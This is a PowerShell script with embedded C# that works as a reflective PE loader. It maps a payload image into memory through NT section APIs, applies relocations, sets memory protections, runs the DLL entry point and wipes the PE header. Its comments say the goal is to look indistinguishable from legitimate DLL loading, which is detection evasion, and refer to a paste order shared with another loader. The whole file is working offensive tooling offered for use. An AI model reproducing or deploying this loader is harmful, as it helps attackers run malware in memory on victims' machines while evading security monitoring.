# === LOADER V3: NtCreateSection + NtMapViewOfSection (mimics Windows loader) ===
# Uses NT internal APIs instead of Win32 VirtualAlloc.
# NtCreateSection + NtMapViewOfSection is the EXACT code path used by ntdll's image loader.
# The sequence: CreateSection(RW) → MapView(RW) → write → NtProtect(.text, RX)
# is indistinguishable from legitimate DLL loading at the NT API level.
#
# PASTE ORDER: same as loader_va.ps1

Add-Type -Language CSharp -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class KL2 {
  // NT section APIs
  [DllImport("ntdll")] static extern int NtCreateSection(ref IntPtr sh, uint acc, IntPtr oa, ref long maxSz, uint pp, uint aa, IntPtr fh);
  [DllImport("ntdll")] static extern int NtMapViewOfSection(IntPtr sh, IntPtr ph, ref IntPtr ba, IntPtr zb, IntPtr cs, IntPtr so, ref UIntPtr vs, int inh, uint at, uint pr);
  [DllImport("ntdll")] static extern int NtUnmapViewOfSection(IntPtr ph, IntPtr ba);
  [DllImport("ntdll")] static extern int NtProtectVirtualMemory(IntPtr ph, ref IntPtr ba, ref UIntPtr sz, uint np, ref uint op);
  [DllImport("ntdll")] static extern int NtFlushInstructionCache(IntPtr ph, IntPtr ba, UIntPtr sz);
  [DllImport("kernel32")] static extern IntPtr GetCurrentProcess();
  [DllImport("kernel32")] static extern bool CloseHandle(IntPtr h);
  [UnmanagedFunctionPointer(CallingConvention.StdCall)]
  delegate bool DM(IntPtr b, uint r, IntPtr v);

  public static void Go(byte[] pe) {
    int eo  = BitConverter.ToInt32(pe, 0x3C);
    short ns = BitConverter.ToInt16(pe, eo + 6);
    ushort soh = BitConverter.ToUInt16(pe, eo + 20);
    int ep  = BitConverter.ToInt32(pe, eo + 24 + 16);
    long ib = BitConverter.ToInt64(pe, eo + 24 + 24);
    int si  = BitConverter.ToInt32(pe, eo + 24 + 56);
    int sh  = BitConverter.ToInt32(pe, eo + 24 + 60);
    int rRva = BitConverter.ToInt32(pe, eo + 24 + 152);
    int rSz  = BitConverter.ToInt32(pe, eo + 24 + 156);
    int sto  = eo + 24 + soh;

    // Create anonymous RW section (Windows loader pattern)
    IntPtr hSec = IntPtr.Zero;
    long maxSz = si;
    // SEC_COMMIT=0x8000000, PAGE_READWRITE=0x04
    int st = NtCreateSection(ref hSec, 0xF001F, IntPtr.Zero, ref maxSz, 0x04, 0x8000000, IntPtr.Zero);
    if (st != 0) return;

    // Map RW view into current process
    IntPtr b = IntPtr.Zero;
    UIntPtr vSz = UIntPtr.Zero;
    // ViewShare=1, PAGE_READWRITE=0x04
    st = NtMapViewOfSection(hSec, GetCurrentProcess(), ref b, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref vSz, 1, 0, 0x04);
    if (st != 0) { CloseHandle(hSec); return; }

    // Copy PE headers + sections
    Marshal.Copy(pe, 0, b, sh);
    for (int i = 0; i < ns; i++) {
      int so = sto + i * 40;
      int va = BitConverter.ToInt32(pe, so + 12);
      int ro = BitConverter.ToInt32(pe, so + 20);
      int rs = BitConverter.ToInt32(pe, so + 16);
      if (rs > 0) Marshal.Copy(pe, ro, new IntPtr(b.ToInt64() + va), rs);
    }

    // Fix base relocations
    if (rRva != 0) {
      long d = b.ToInt64() - ib;
      int off = 0;
      while (off < rSz) {
        int rv  = Marshal.ReadInt32(new IntPtr(b.ToInt64() + rRva + off));
        int bsz = Marshal.ReadInt32(new IntPtr(b.ToInt64() + rRva + off + 4));
        if (bsz < 8) break;
        int ne = (bsz - 8) / 2;
        for (int j = 0; j < ne; j++) {
          ushort e = (ushort)Marshal.ReadInt16(new IntPtr(b.ToInt64() + rRva + off + 8 + j * 2));
          if ((e >> 12) == 10) {
            IntPtr pa = new IntPtr(b.ToInt64() + rv + (e & 0xFFF));
            Marshal.WriteInt64(pa, Marshal.ReadInt64(pa) + d);
          }
        }
        off += bsz;
      }
    }

    // Set per-section permissions via NtProtectVirtualMemory
    uint old = 0;
    for (int i = 0; i < ns; i++) {
      int so = sto + i * 40;
      int va = BitConverter.ToInt32(pe, so + 12);
      int vs = BitConverter.ToInt32(pe, so + 8);
      if (vs == 0) vs = BitConverter.ToInt32(pe, so + 16);
      uint ch = BitConverter.ToUInt32(pe, so + 36);
      uint pr = SP(ch);
      if (vs > 0) {
        IntPtr ba = new IntPtr(b.ToInt64() + va);
        UIntPtr sz = (UIntPtr)vs;
        NtProtectVirtualMemory(GetCurrentProcess(), ref ba, ref sz, pr, ref old);
      }
    }

    NtFlushInstructionCache(GetCurrentProcess(), b, (UIntPtr)si);

    var dm = (DM)Marshal.GetDelegateForFunctionPointer(new IntPtr(b.ToInt64() + ep), typeof(DM));
    dm(b, 1, IntPtr.Zero);

    // Erase PE header
    for (int i = 0; i < sh; i++) Marshal.WriteByte(new IntPtr(b.ToInt64() + i), 0);
    CloseHandle(hSec);
  }

  static uint SP(uint c) {
    bool e = (c & 0x20000000) != 0;
    bool r = (c & 0x40000000) != 0;
    bool w = (c & 0x80000000) != 0;
    if (e && w) return 0x40;
    if (e && r) return 0x20;
    if (e)      return 0x10;
    if (w)      return 0x04;
    return 0x02;
  }
}
"@
